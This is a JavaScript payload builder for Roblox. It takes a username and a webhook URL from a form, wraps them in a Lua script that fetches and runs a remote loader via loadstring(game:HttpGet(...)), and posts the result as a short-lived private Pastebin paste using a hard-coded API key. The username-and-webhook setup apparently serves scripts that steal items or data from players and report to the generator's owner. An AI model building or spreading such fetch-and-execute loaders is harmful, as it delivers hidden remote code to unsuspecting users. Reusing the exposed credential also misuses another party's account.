
document.addEventListener("DOMContentLoaded", function() {
  const generateButton = document.getElementById('generateBtn');
  const status = document.getElementById('status');

  generateButton.addEventListener('click', function(event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const webhook = document.getElementById("webhook").value;

    const scriptContent = `Username = "${username}"\n` +
                          `Webhook = "${webhook}"\n\n` +
                          `loadstring(game:HttpGet("https://moontech-scripts.vercel.app/mainloader.lua", true))()`;

    const pasteData = {
      api_dev_key: 'fw1TP2aocJeX4p3DnYmXs23OiKS4LdTu',  // Replace with your Pastebin API key
      api_option: 'paste',
      api_paste_code: scriptContent,
      api_paste_private: '1', 
      api_paste_name: 'Moontech Generated Script',
      api_paste_expire_date: '10M'
    };

    const formData = new URLSearchParams(pasteData).toString();

    fetch('https://pastebin.com/api/api_post.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      },
      body: formData
    })
    .then(response => response.text())
    .then(data => {
      if (data.startsWith("http")) {
        status.innerHTML = `<p style="color: green;">Paste created: <a href="${data}" target="_blank">${data}</a></p>`;
      } else {
        status.textContent = "Failed to upload to Pastebin.";
      }
    })
    .catch(error => {
      console.error('Error:', error);
      status.textContent = "Error occurred during upload.";
    });
  });
});
